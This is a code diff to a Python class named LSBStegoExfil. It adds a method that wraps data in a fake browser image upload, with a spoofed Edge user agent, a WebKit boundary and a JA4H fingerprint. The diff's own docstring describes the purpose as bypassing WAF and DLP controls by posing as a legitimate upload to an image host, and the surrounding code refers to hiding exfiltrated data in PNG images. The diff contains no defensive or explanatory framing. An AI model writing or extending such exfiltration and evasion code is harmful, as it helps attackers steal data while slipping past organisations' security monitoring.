@@ -142,6 +142,42 @@ class LSBStegoExfil:
             logger.error(f"LSB decode failed: {exc}")
             return None
 
+    def exfil_to_edge_multipart(self, data: bytes, boundary: str = None) -> Dict[str, Any]:
+        """
+        Mimic Edge/Chrome multipart/form-data upload for WAF/DLP bypass.
+        Appears as legitimate image upload to image hosting service.
+        """
+        import time as time_module
+
+        if boundary is None:
+            boundary = "----WebKitFormBoundary" + hashlib.md5(str(time_module.time()).encode()).hexdigest()[:16]
+
+        ja4h_fingerprint = "t13d211221_c02b_0364"
+        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edge/122.0.0.0"
+
+        body = (
+            f"--{boundary}\r\n"
+            f'Content-Disposition: form-data; name="image"; filename="upload.png"\r\n'
+            f"Content-Type: image/png\r\n\r\n"
+        ).encode() + data + f"\r\n--{boundary}--\r\n".encode()
+
+        headers = {
+            "User-Agent": user_agent,
+            "Content-Type": f"multipart/form-data; boundary={boundary}",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate, br",
+            "JA4H-Signature": ja4h_fingerprint,
+        }
+
+        return {
+            "method": "POST",
+            "headers": headers,
+            "body": body,
+            "ja4h_fingerprint": ja4h_fingerprint,
+            "mimicry": "Edge 122 multipart/form-data upload",
+        }
+
     def create_exfil_image(self, data: bytes, width: int = 256, height: int = 256) -> Optional[bytes]:
         """
         Create a PNG image containing hidden exfiltrated data.
